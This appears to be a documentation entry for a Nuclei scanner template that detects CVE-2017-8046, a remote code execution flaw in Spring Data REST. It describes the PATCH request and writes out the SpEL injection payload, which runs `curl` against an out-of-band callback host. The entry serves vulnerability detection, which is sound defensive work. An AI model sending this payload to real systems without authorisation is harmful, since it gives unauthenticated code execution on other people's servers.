---
cve_id: CVE-2017-8046
template_path: nuclei-templates/http/cves/2017/CVE-2017-8046.yaml
affected_product: Spring Data REST
severity: critical
authentication: none
external_callback: true
affected_versions: Spring Data REST < 2.6.9 (Ingalls SR9) / 3.0.1 (Kay SR1); Spring Boot < 1.5.9 / < 2.0 M6
preconditions: Accessible Spring Data REST repository endpoints
poc_classification: rce
---

## Vulnerability
Spring Data REST versions prior to 2.6.9 (Ingalls SR9) and 3.0.1 (Kay SR1), together with Spring Boot versions prior to 1.5.9 and 2.0 M6, are affected by a remote code execution flaw. Malicious PATCH requests carrying crafted JSON Patch payloads trigger unsafe SpEL expression evaluation during entity processing, enabling unauthenticated attackers to run arbitrary Java code.  
CVSS v3.0: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) • CWE-20 • Vendor: VMware (Spring) • CPE: cpe:2.3:a:vmware:spring_boot:*:*:*:*:*:*:*:*

## PoC / Detection
Classification: rce  
The template first sends a GET request to `{{BaseURL}}` (following up to 3 redirects) and matches HAL+JSON responses containing `application/hal+json` (or related content types) plus body elements `_embedded`, `_links`, `page`, or `size`. It extracts the collection endpoint href via regex matching `"href"\s*:\s*"([^"]+)\{\?page,size,sort\}"`. A subsequent PATCH request is issued to the discovered `{{endpoint}}/1` with `Content-Type: application/json-patch+json` and a JSON array payload using an `op: replace` operation that injects the SpEL expression `T(java.lang.Runtime).getRuntime().exec("curl {{interactsh-url}}").x`. Success is confirmed by an OOB DNS interaction on interactsh and the string `org.springframework` in the response body.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2017-8046
- https://spring.io/security/cve-2017-8046
- https://access.redhat.com/errata/RHSA-2018:2405
- https://www.exploit-db.com/exploits/44289/
- https://github.com/jkutner/spring-break-cve-2017-8046
